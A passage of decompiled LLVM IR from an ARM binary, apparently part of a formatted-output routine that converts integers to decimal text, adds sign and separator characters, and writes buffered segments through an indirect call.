  %v1_18dd4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_18da4

dec_label_pc_18da4:                               ; preds = %bb236, %dec_label_pc_18d94, %dec_label_pc_190a4, %dec_label_pc_18d88
  %v1_18dd4 = phi i32 [ %v1_18d58, %dec_label_pc_18d88 ], [ %v1_18d58, %dec_label_pc_190a4 ], [ %v1_18dd4.pre.pre, %bb236 ], [ %v1_18d58, %dec_label_pc_18d94 ]
  %v1_18e4c30 = phi i32 [ 0, %dec_label_pc_18d88 ], [ 0, %dec_label_pc_190a4 ], [ %v0_18da0.pre, %bb236 ], [ %v0_18d94, %dec_label_pc_18d94 ]
  store i32 %v1_18e4c30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_18db0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_18db0, i32* %r3.global-to-local, align 4
  %v0_18dbc = load i32, i32* %r2.global-to-local, align 4
  %v1_18dbc = inttoptr i32 %v0_18dbc to i8*
  %v2_18dbc = load i8, i8* %v1_18dbc, align 1
  %v3_18dbc = zext i8 %v2_18dbc to i32
  store i32 %v3_18dbc, i32* %r3.global-to-local, align 4
  %v5_18dbc = add i32 %v0_18dbc, 1
  store i32 %v5_18dbc, i32* %r2.global-to-local, align 4
  %v1_18dc0 = icmp slt i32 %v1_18e4c30, 0
  %v2_18dc0 = icmp eq i32 %v1_18e4c30, 0
  store i1 %v2_18dc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_18dbc, i32* %r6.global-to-local, align 4
  store i32 %v3_18dbc, i32* %stack_var_-42, align 4
  %v2_18dd4 = sub i32 %v1_18dd4, %v5_18dbc
  store i32 %v2_18dd4, i32* %ip.global-to-local, align 4
  br i1 %v1_18dc0, label %.thread, label %dec_label_pc_18de0

.thread:                                          ; preds = %dec_label_pc_18da4
  %v5_18dd8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_18dd8, i32* @r7, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18da4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_18de4 = sub i32 %v1_18e4c30, %v2_18dd4
  %v4_18de4 = xor i32 %v2_18dd4, %v1_18e4c30
  %v5_18de4 = xor i32 %v2_18de4, %v1_18e4c30
  %v6_18de4 = and i32 %v5_18de4, %v4_18de4
  %v7_18de4 = icmp slt i32 %v6_18de4, 0
  %v8_18de4 = icmp slt i32 %v2_18de4, 0
  %v9_18de4 = icmp eq i32 %v1_18e4c30, %v2_18dd4
  store i1 %v9_18de4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_18df0 = xor i1 %v8_18de4, %v7_18de4
  br i1 %v2_18df0, label %dec_label_pc_18e3c, label %dec_label_pc_18df4

dec_label_pc_18df4:                               ; preds = %dec_label_pc_18de0
  store i32 %v2_18de4, i32* %r2.global-to-local, align 4
  %v2_18df8 = icmp eq i32 %v2_18de4, 0
  store i1 %v2_18df8, i1* %cpsr_z.global-to-local, align 1
  %v2_18dfc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_18dfc, i32* %lr.global-to-local, align 4
  %tmp237 = icmp slt i32 %v2_18de4, 1
  br i1 %tmp237, label %.thread145, label %dec_label_pc_18e10

.thread145:                                       ; preds = %dec_label_pc_18df4
  %v7_18e04 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_18e04, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18df4
  store i32 ptrtoint (i32* @global_var_23c63.1006 to i32), i32* %r3.global-to-local, align 4
  %v2_18e20 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_18e20, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18e3c:                               ; preds = %dec_label_pc_18de0
  store i1 %v2_18dc0, i1* %cpsr_z.global-to-local, align 1
  %v2_18e40 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_18e40, i32* %lr.global-to-local, align 4
  br i1 %v2_18dc0, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_18e3c
  %v3_18e48 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_18e48, i32* @r7, align 4
  br label %.thread34

bb239:                                            ; preds = %dec_label_pc_18e3c
  %v3_18e4c = sub i32 %v2_18dd4, %v1_18e4c30
  store i32 %v3_18e4c, i32* %ip.global-to-local, align 4
  %v3_18e5063 = add i32 %v5_18dbc, %v1_18e4c30
  store i32 %v3_18e5063, i32* %r6.global-to-local, align 4
  %v3_18e54 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_18e54, i32* @r7, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread145, %bb238, %bb239
  %v1_18e9c261 = phi i32 [ %v3_18e48, %bb238 ], [ %v3_18e54, %bb239 ], [ %v7_18e04, %.thread145 ]
  %v0_18e70100 = phi i32 [ %v2_18dd4, %bb238 ], [ %v3_18e4c, %bb239 ], [ 0, %.thread145 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18e5c:                               ; preds = %.thread, %dec_label_pc_18e10, %.thread34
  %v1_18e9c = phi i32 [ %v2_18e20, %dec_label_pc_18e10 ], [ %v1_18e9c261, %.thread34 ], [ %v5_18dd8, %.thread ]
  %v0_18eb0107 = phi i32 [ -1, %dec_label_pc_18e10 ], [ -1, %.thread34 ], [ %v1_18e4c30, %.thread ]
  %v0_18e70 = phi i32 [ 0, %dec_label_pc_18e10 ], [ %v0_18e70100, %.thread34 ], [ %v2_18dd4, %.thread ]
  %v3_18e5c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_18e5c, i32* %r2.global-to-local, align 4
  %v1_18e60 = add i32 %v3_18e5c, 12
  %v2_18e60 = inttoptr i32 %v1_18e60 to i32*
  %v3_18e60 = load i32, i32* %v2_18e60, align 4
  %v1_18e64 = and i32 %v3_18e60, 16
  store i32 %v1_18e64, i32* %r4.global-to-local, align 4
  %v2_18e64 = icmp eq i32 %v1_18e64, 0
  %tmp266 = zext i1 %v2_18e64 to i32
  %.255 = xor i32 %tmp266, 1
  store i32 %.255, i32* %r3.global-to-local, align 4
  %v2_18e70 = icmp eq i32 %v0_18e70, 0
  store i1 %v2_18e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e70, label %bb242, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_18e5c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18e8c

bb242:                                            ; preds = %dec_label_pc_18e5c
  store i1 %v2_18e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e64, label %dec_label_pc_18e80, label %dec_label_pc_18e8c

dec_label_pc_18e80:                               ; preds = %bb242
  %v0_18e80 = load i32, i32* %sb.global-to-local, align 4
  %v7_18e80 = icmp eq i32 %v0_18e80, 103
  store i1 %v7_18e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e80, label %dec_label_pc_18eb0, label %bb243

bb243:                                            ; preds = %dec_label_pc_18e80
  %v1_18e84 = load i32, i32* %fp.global-to-local, align 4
  %v3_18e84 = icmp eq i32 %v1_18e84, 0
  store i1 %v3_18e84, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v1_18e84, 1
  br i1 %tmp244, label %dec_label_pc_18eb0, label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %.thread37, %bb242, %bb243
  store i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), i32* %lr.global-to-local, align 4
  %v2_18e9c = inttoptr i32 %v1_18e9c to i32*
  store i32 112, i32* %v2_18e9c, align 4
  store i32 ptrtoint (i32* @global_var_23c70.1007 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_18ea8 = load i32, i32* @r7, align 4
  %v1_18ea8 = add i32 %v0_18ea8, 4
  %v2_18ea8 = inttoptr i32 %v1_18ea8 to i32*
  store i32 1, i32* %v2_18ea8, align 4
  %v4_18ea8 = add i32 %v0_18ea8, 8
  %v5_18ea8 = inttoptr i32 %v4_18ea8 to i32*
  %v6_18ea8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_18ea8, i32* %v5_18ea8, align 4
  %v0_18eac = load i32, i32* @r7, align 4
  %v1_18eac = add i32 %v0_18eac, 12
  store i32 %v1_18eac, i32* @r7, align 4
  %v0_18eb0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18eb0

dec_label_pc_18eb0:                               ; preds = %dec_label_pc_18e80, %bb243, %dec_label_pc_18e8c
  %v1_18ed0 = phi i32 [ %v1_18e9c, %bb243 ], [ %v1_18eac, %dec_label_pc_18e8c ], [ %v1_18e9c, %dec_label_pc_18e80 ]
  %v0_18eb0 = phi i32 [ %v0_18eb0107, %bb243 ], [ %v0_18eb0.pre, %dec_label_pc_18e8c ], [ %v0_18eb0107, %dec_label_pc_18e80 ]
  %v1_18eb0 = add i32 %v0_18eb0, 1
  store i32 %v1_18eb0, i32* @lr, align 4
  %v6_18eb0 = icmp slt i32 %v1_18eb0, 0
  %v7_18eb0 = icmp eq i32 %v1_18eb0, 0
  store i1 %v7_18eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_18eb0, label %dec_label_pc_18eb8, label %dec_label_pc_18edc

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18eb0
  store i32 ptrtoint (i32* @global_var_23c63.1006 to i32), i32* %r3.global-to-local, align 4
  %v1_18ec8 = sub i32 -1, %v0_18eb0
  store i32 %v1_18ec8, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_18ed0 = inttoptr i32 %v1_18ed0 to i32*
  store i32 176, i32* %v2_18ed0, align 4
  %v0_18ed4 = load i32, i32* @r7, align 4
  %v1_18ed4 = add i32 %v0_18ed4, 4
  %v2_18ed4 = inttoptr i32 %v1_18ed4 to i32*
  %v3_18ed4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_18ed4, i32* %v2_18ed4, align 4
  %v4_18ed4 = add i32 %v0_18ed4, 8
  %v5_18ed4 = inttoptr i32 %v4_18ed4 to i32*
  %v6_18ed4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_18ed4, i32* %v5_18ed4, align 4
  %v0_18ed8 = load i32, i32* @r7, align 4
  %v1_18ed8 = add i32 %v0_18ed8, 12
  store i32 %v1_18ed8, i32* @r7, align 4
  br label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18eb0, %dec_label_pc_18eb8
  %v2_18ee4 = phi i32 [ %v1_18ed0, %dec_label_pc_18eb0 ], [ %v1_18ed8, %dec_label_pc_18eb8 ]
  %v0_18edc = load i32, i32* %ip.global-to-local, align 4
  %v2_18edc = icmp eq i32 %v0_18edc, 0
  store i1 %v2_18edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18edc, label %.thread46, label %bb245

bb245:                                            ; preds = %dec_label_pc_18edc
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_18ee4 = inttoptr i32 %v2_18ee4 to i32*
  store i32 112, i32* %v3_18ee4, align 4
  %v1_18ee8 = load i32, i32* %r6.global-to-local, align 4
  %v2_18ee8 = load i32, i32* @r7, align 4
  %v3_18ee8 = add i32 %v2_18ee8, 8
  %v4_18ee8 = inttoptr i32 %v3_18ee8 to i32*
  store i32 %v1_18ee8, i32* %v4_18ee8, align 4
  %v1_18eec = load i32, i32* %ip.global-to-local, align 4
  %v2_18eec = load i32, i32* @r7, align 4
  %v3_18eec = add i32 %v2_18eec, 4
  %v4_18eec = inttoptr i32 %v3_18eec to i32*
  store i32 %v1_18eec, i32* %v4_18eec, align 4
  %v1_18ef0 = load i32, i32* @r7, align 4
  %v2_18ef0 = add i32 %v1_18ef0, 12
  store i32 %v2_18ef0, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_18edc, %bb245
  %v1_18f28 = phi i32 [ %v2_18ee4, %dec_label_pc_18edc ], [ %v2_18ef0, %bb245 ]
  %v0_18ef4 = load i32, i32* %sb.global-to-local, align 4
  %v7_18ef4 = icmp eq i32 %v0_18ef4, 103
  store i1 %v7_18ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ef4, label %dec_label_pc_18efc, label %dec_label_pc_18f04

dec_label_pc_18efc:                               ; preds = %.thread46
  %v0_18efc = load i32, i32* %r4.global-to-local, align 4
  %v2_18efc = icmp eq i32 %v0_18efc, 0
  store i1 %v2_18efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18efc, label %dec_label_pc_18f34, label %dec_label_pc_18f04

dec_label_pc_18f04:                               ; preds = %.thread46, %dec_label_pc_18efc
  %v0_18f04 = load i32, i32* @lr, align 4
  %v1_18f04 = load i32, i32* %ip.global-to-local, align 4
  %v2_18f04 = sub i32 %v1_18f04, %v0_18f04
  store i32 %v2_18f04, i32* %r1.global-to-local, align 4
  %v1_18f08 = load i32, i32* %fp.global-to-local, align 4
  %v2_18f08 = sub i32 %v2_18f04, %v1_18f08
  %v4_18f08 = xor i32 %v1_18f08, %v2_18f04
  %v5_18f08 = xor i32 %v2_18f08, %v2_18f04
  %v6_18f08 = and i32 %v5_18f08, %v4_18f08
  %v7_18f08 = icmp slt i32 %v6_18f08, 0
  %v8_18f08 = icmp slt i32 %v2_18f08, 0
  %v9_18f08 = icmp eq i32 %v2_18f04, %v1_18f08
  store i1 %v9_18f08, i1* %cpsr_z.global-to-local, align 1
  %v2_18f0c = xor i1 %v8_18f08, %v7_18f08
  br i1 %v2_18f0c, label %dec_label_pc_18f10, label %dec_label_pc_18f34

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18f04
  %v2_18f1c = sub i32 %v1_18f08, %v2_18f04
  store i32 %v2_18f1c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23c63.1006 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_18f28 = inttoptr i32 %v1_18f28 to i32*
  store i32 176, i32* %v2_18f28, align 4
  %v0_18f2c = load i32, i32* @r7, align 4
  %v1_18f2c = add i32 %v0_18f2c, 4
  %v2_18f2c = inttoptr i32 %v1_18f2c to i32*
  %v3_18f2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_18f2c, i32* %v2_18f2c, align 4
  %v4_18f2c = add i32 %v0_18f2c, 8
  %v5_18f2c = inttoptr i32 %v4_18f2c to i32*
  %v6_18f2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_18f2c, i32* %v5_18f2c, align 4
  %v0_18f30 = load i32, i32* @r7, align 4
  %v1_18f30 = add i32 %v0_18f30, 12
  store i32 %v1_18f30, i32* @r7, align 4
  br label %dec_label_pc_18f34

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18f04, %dec_label_pc_18efc, %dec_label_pc_18f10
  %v1_18fc8.pre.pre = phi i32 [ %v1_18f28, %dec_label_pc_18f04 ], [ %v1_18f28, %dec_label_pc_18efc ], [ %v1_18f30, %dec_label_pc_18f10 ]
  %v0_18f34 = load i32, i32* %r8.global-to-local, align 4
  %v7_18f34 = icmp eq i32 %v0_18f34, 102
  store i1 %v7_18f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f34, label %dec_label_pc_18fbc, label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f34
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18f40 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f40 = icmp slt i32 %v0_18f40, 0
  %v2_18f40 = icmp eq i32 %v0_18f40, 0
  store i1 %v2_18f40, i1* %cpsr_z.global-to-local, align 1
  %v4_18f44 = select i1 %tmp270, i32 %v4_18c60123127, i32 101
  store i32 %v4_18f44, i32* @r4, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_18f54 = sub i32 0, %v0_18f40
  %storemerge155 = select i1 %v1_18f40, i32 %v4_18f54, i32 %v0_18f40
  %tmp267 = ashr i32 %v0_18f40, 31
  %tmp268 = and i32 %tmp267, 2
  %tmp269 = add nuw nsw i32 %tmp268, 43
  store i32 %storemerge155, i32* %r5.global-to-local, align 4
  store i32 %tmp269, i32* %sl.global-to-local, align 4
  %v2_18f5c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_18f5c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18f64

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18f94, %dec_label_pc_18f64, %dec_label_pc_18f3c
  %v0_18f64 = phi i32 [ %storemerge155, %dec_label_pc_18f3c ], [ %v0_18f80, %dec_label_pc_18f64 ], [ %v0_18f80, %dec_label_pc_18f94 ]
  store i32 %v0_18f64, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_18f6c = call i32 @function_1d400(i32 %v0_18f64, i32 10)
  store i32 58, i32* %r3.global-to-local, align 4
  %v0_18f74 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18f74, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v2_18f7c = load i32, i32* %r6.global-to-local, align 4
  %v3_18f7c = add i32 %v2_18f7c, -1
  %v4_18f7c = inttoptr i32 %v3_18f7c to i8*
  store i8 58, i8* %v4_18f7c, align 1
  %v5_18f7c = load i32, i32* %r6.global-to-local, align 4
  %v6_18f7c = add i32 %v5_18f7c, -1
  store i32 %v6_18f7c, i32* %r6.global-to-local, align 4
  %v0_18f80 = call i32 @function_1d2d4()
  store i32 %v0_18f80, i32* %r0.global-to-local, align 4
  %v0_18f84 = load i32, i32* %r8.global-to-local, align 4
  %v1_18f84 = add i32 %v0_18f84, 1
  store i32 %v1_18f84, i32* %r8.global-to-local, align 4
  %v7_18f88 = icmp eq i32 %v1_18f84, 3
  store i1 %v7_18f88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_18f80, i32* %r5.global-to-local, align 4
  br i1 %v7_18f88, label %dec_label_pc_18f64, label %dec_label_pc_18f94

dec_label_pc_18f94:                               ; preds = %dec_label_pc_18f64
  %v2_18f94 = icmp eq i32 %v0_18f80, 0
  store i1 %v2_18f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f94, label %dec_label_pc_18f9c, label %dec_label_pc_18f64

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18f94
  %v0_18f9c = load i32, i32* %r6.global-to-local, align 4
  %v1_18f9c = add i32 %v0_18f9c, -1
  store i32 %v1_18f9c, i32* %r3.global-to-local, align 4
  %v0_18fa0 = load i32, i32* %sl.global-to-local, align 4
  %v1_18fa0 = trunc i32 %v0_18fa0 to i8
  %v4_18fa0 = inttoptr i32 %v1_18f9c to i8*
  store i8 %v1_18fa0, i8* %v4_18fa0, align 1
  %v0_18fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18fa4 = add i32 %v0_18fa4, -1
  store i32 %v1_18fa4, i32* %r2.global-to-local, align 4
  %v0_18fa8 = load i32, i32* @r4, align 4
  %v1_18fa8 = trunc i32 %v0_18fa8 to i8
  %v4_18fa8 = inttoptr i32 %v1_18fa4 to i8*
  store i8 %v1_18fa8, i8* %v4_18fa8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_18fb0 = load i32, i32* @r7, align 4
  %v1_18fb0 = inttoptr i32 %v0_18fb0 to i32*
  store i32 112, i32* %v1_18fb0, align 4
  %v3_18fb0 = add i32 %v0_18fb0, 4
  %v4_18fb0 = inttoptr i32 %v3_18fb0 to i32*
  %v5_18fb0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_18fb0, i32* %v4_18fb0, align 4
  %v0_18fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18fb4 = load i32, i32* @r7, align 4
  %v2_18fb4 = add i32 %v1_18fb4, 8
  %v3_18fb4 = inttoptr i32 %v2_18fb4 to i32*
  store i32 %v0_18fb4, i32* %v3_18fb4, align 4
  %v0_18fb8 = load i32, i32* @r7, align 4
  %v1_18fb8 = add i32 %v0_18fb8, 12
  store i32 %v1_18fb8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18fbc

dec_label_pc_18fbc:                               ; preds = %dec_label_pc_18f34, %.thread121, %dec_label_pc_18f9c
  %v1_18fc8.pre = phi i32 [ %v2_18a94, %.thread121 ], [ %v1_18fb8, %dec_label_pc_18f9c ], [ %v1_18fc8.pre.pre, %dec_label_pc_18f34 ]
  %v2_18fbc = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_18fbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18fc0

dec_label_pc_18fc0:                               ; preds = %dec_label_pc_18fc0, %dec_label_pc_18fbc
  %v0_18fc0 = phi i32 [ %v2_18fbc, %dec_label_pc_18fbc ], [ %v4_18fc0, %dec_label_pc_18fc0 ]
  %stack_var_-188.0 = phi i32 [ %v3_18930, %dec_label_pc_18fbc ], [ %v2_18fcc, %dec_label_pc_18fc0 ]
  %v1_18fc0 = inttoptr i32 %v0_18fc0 to i32*
  %v2_18fc0 = load i32, i32* %v1_18fc0, align 4
  store i32 %v2_18fc0, i32* %r3.global-to-local, align 4
  %v4_18fc0 = add i32 %v0_18fc0, 12
  store i32 %v4_18fc0, i32* %r2.global-to-local, align 4
  %v3_18fc8 = icmp ult i32 %v4_18fc0, %v1_18fc8.pre
  %v2_18fcc = sub i32 %stack_var_-188.0, %v2_18fc0
  store i32 %v2_18fcc, i32* %ip.global-to-local, align 4
  br i1 %v3_18fc8, label %dec_label_pc_18fc0, label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fc0
  %v3_18fd8 = load i8, i8* %stack_var_-46, align 1
  %v4_18fd8 = sext i8 %v3_18fd8 to i32
  store i32 %v4_18fd8, i32* %r3.global-to-local, align 4
  store i32 %v4_18fd8, i32* %r2.global-to-local, align 4
  %v2_18fdc = icmp eq i8 %v3_18fd8, 0
  store i1 %v2_18fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fdc, label %bb250, label %bb249

bb249:                                            ; preds = %dec_label_pc_18fd8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %dec_label_pc_18fd8, %bb249
  %v1_1903c = phi i32 [ %v4_18fd8, %dec_label_pc_18fd8 ], [ 1, %bb249 ]
  %v2_18fe4 = sub i32 %v2_18fcc, %v1_1903c
  store i32 %v2_18fe4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_18fec = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_18fec, i32* %r3.global-to-local, align 4
  %v2_18ff0 = icmp eq i32 %v2_18fe4, 0
  store i1 %v2_18ff0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp251 = icmp slt i32 %v2_18fe4, 1
  br i1 %tmp251, label %dec_label_pc_19058, label %dec_label_pc_19004

dec_label_pc_19004:                               ; preds = %bb250
  %v3_19004 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19004, i32* %lr.global-to-local, align 4
  %v1_19008 = add i32 %v3_19004, 12
  %v2_19008 = inttoptr i32 %v1_19008 to i32*
  %v3_19008 = load i32, i32* %v2_19008, align 4
  store i32 %v3_19008, i32* %r3.global-to-local, align 4
  %v1_1900c = and i32 %v3_19008, 8
  %v2_1900c = icmp eq i32 %v1_1900c, 0
  store i1 %v2_1900c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1900c, label %dec_label_pc_19030, label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_19004
  store i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23c63.1006 to i32), i32* %r3.global-to-local, align 4
  %v1_19024 = add i32 %v1_18fc8.pre, 12
  store i32 %v1_19024, i32* %r6.global-to-local, align 4
  %v1_19028 = inttoptr i32 %v1_18fc8.pre to i32*
  store i32 160, i32* %v1_19028, align 4
  %v3_19028 = add i32 %v1_18fc8.pre, 4
  %v4_19028 = inttoptr i32 %v3_19028 to i32*
  %v5_19028 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19028, i32* %v4_19028, align 4
  %v6_19028 = add i32 %v1_18fc8.pre, 8
  %v7_19028 = inttoptr i32 %v6_19028 to i32*
  %v8_19028 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_19028, i32* %v7_19028, align 4
  br label %dec_label_pc_1905c

dec_label_pc_19030:                               ; preds = %dec_label_pc_19004
  store i32 %v3_19004, i32* %ip.global-to-local, align 4
  %v1_19034 = add i32 %v3_19004, 16
  %v2_19034 = inttoptr i32 %v1_19034 to i32*
  %v3_19034 = load i32, i32* %v2_19034, align 4
  store i32 %v3_19034, i32* %r3.global-to-local, align 4
  %v7_19038 = icmp eq i32 %v3_19034, 48
  store i1 %v7_19038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19038, label %.thread54.thread70, label %bb252

bb252:                                            ; preds = %dec_label_pc_19030
  store i32 %v2_18fcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19058

.thread54.thread70:                               ; preds = %dec_label_pc_19030
  %v4_19044 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_18fc8.pre, i32* %r6.global-to-local, align 4
  %v3_1904c = add i32 %v4_19044, %v2_18fe4
  store i32 %v3_1904c, i32* %r3.global-to-local, align 4
  store i32 %v3_1904c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1905c

dec_label_pc_19058:                               ; preds = %bb252, %bb250
  store i32 %v1_18fc8.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1905c

dec_label_pc_1905c:                               ; preds = %.thread54.thread70, %dec_label_pc_19014, %dec_label_pc_19058
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_19060 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_19060, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19064

dec_label_pc_19064:                               ; preds = %dec_label_pc_1908c, %dec_label_pc_1905c
  %v0_19064 = phi i32 [ %v1_19080, %dec_label_pc_1908c ], [ %v2_19060, %dec_label_pc_1905c ]
  %v1_19064 = inttoptr i32 %v0_19064 to i32*
  %v2_19064 = load i32, i32* %v1_19064, align 4
  store i32 %v2_19064, i32* %r1.global-to-local, align 4
  %v3_19064 = add i32 %v0_19064, 4
  %v4_19064 = inttoptr i32 %v3_19064 to i32*
  %v5_19064 = load i32, i32* %v4_19064, align 4
  store i32 %v5_19064, i32* %r2.global-to-local, align 4
  %v6_19064 = add i32 %v0_19064, 8
  %v7_19064 = inttoptr i32 %v6_19064 to i32*
  %v8_19064 = load i32, i32* %v7_19064, align 4
  store i32 %v8_19064, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 102520, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_19078 = load i32, i32* %r5.global-to-local, align 4
  %v1_19078 = add i32 %v0_19078, 4
  %v2_19078 = inttoptr i32 %v1_19078 to i32*
  %v3_19078 = load i32, i32* %v2_19078, align 4
  store i32 %v3_19078, i32* %r3.global-to-local, align 4
  %v0_1907c = load i32, i32* %r0.global-to-local, align 4
  %v9_1907c = icmp eq i32 %v0_1907c, %v3_19078
  store i1 %v9_1907c, i1* %cpsr_z.global-to-local, align 1
  %v1_19080 = add i32 %v0_19078, 12
  store i32 %v1_19080, i32* %r5.global-to-local, align 4
  br i1 %v9_1907c, label %dec_label_pc_1908c, label %bb253

bb253:                                            ; preds = %dec_label_pc_19064
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_190ac

dec_label_pc_1908c:                               ; preds = %dec_label_pc_19064
  %v0_19090.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1908c = load i32, i32* %r6.global-to-local, align 4
  %v3_1908c = icmp ult i32 %v1_19080, %v1_1908c
  %v9_1908c = icmp eq i32 %v1_19080, %v1_1908c
  store i1 %v9_1908c, i1* %cpsr_z.global-to-local, align 1
  %v2_19090 = add i32 %v0_19090.pre, %v3_19078
  store i32 %v2_19090, i32* %r7.global-to-local, align 4
  br i1 %v3_1908c, label %dec_label_pc_19064, label %dec_label_pc_190ac

dec_label_pc_190a4:                               ; preds = %.thread21, %bb235
  %v0_190a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_190a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18da4

dec_label_pc_190ac:                               ; preds = %dec_label_pc_1908c, %bb253
  %v0_190ac = phi i32 [ -1, %bb253 ], [ %v2_19090, %dec_label_pc_1908c ]
  store i32 %v0_190ac, i32* %r0.global-to-local, align 4
  store i32 %v3_188e8, i32* %r4.global-to-local, align 4
  store i32 %v6_188e8, i32* @r5, align 4
  store i32 %v9_188e8, i32* @r6, align 4
  store i32 %v12_188e8, i32* @r7, align 4
  store i32 %v27_188e8, i32* @lr, align 4
  ret i32 %v0_190ac

; uselistorder directives
  uselistorder i32 %v0_190ac, { 1, 0 }
  uselistorder i32 %v1_1908c, { 1, 0 }
